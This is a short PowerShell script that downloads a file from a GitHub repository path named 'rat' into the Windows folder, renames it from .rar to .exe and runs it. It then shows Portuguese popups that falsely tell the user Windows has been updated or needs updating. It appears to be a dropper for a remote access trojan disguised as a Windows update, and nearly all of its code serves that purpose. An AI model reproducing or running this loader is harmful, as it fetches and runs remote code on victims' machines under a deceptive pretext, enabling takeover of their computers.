
cd\
cd c:\windows

$url = "https://raw.githubusercontent.com/itarare/rat/master/Instalar.rar"
$output = "c:\windows\Instalar.rar"
$start_time = Get-Date

Invoke-WebRequest -Uri $url -OutFile $output
Write-Output "[ $((Get-Date).Subtract($start_time).Seconds) ]"

$fs = 'c:\windows\Instalar.rar'
if (Test-Path $fs) {
	rename-item -path c:\windows\Instalar.rar -newname c:\windows\Instalar.exe   
   Start-Sleep -s 1

   $fs = 'c:\windows\Instalar.exe'
   if (Test-Path $fs) {
      Start-Process -FilePath $fs

      $r2 = Get-Process Java -ErrorAction SilentlyContinue
      if ($r2) { 
         $wshell.Popup("Windows atualizado.", 0, "Aten��o !", 0x0)
      } else {
         $wshell.Popup("Atualize o Windows 0x03.", 0, "Aten��o !", 0x0)
      }
   } else {
      $wshell.Popup("Atualize o Windows 0x02.", 0, "Aten��o !", 0x0)
   }
} else {
   $wshell.Popup("Atualize o Windows 0x01.", 0, "Aten��o !", 0x0)  
}
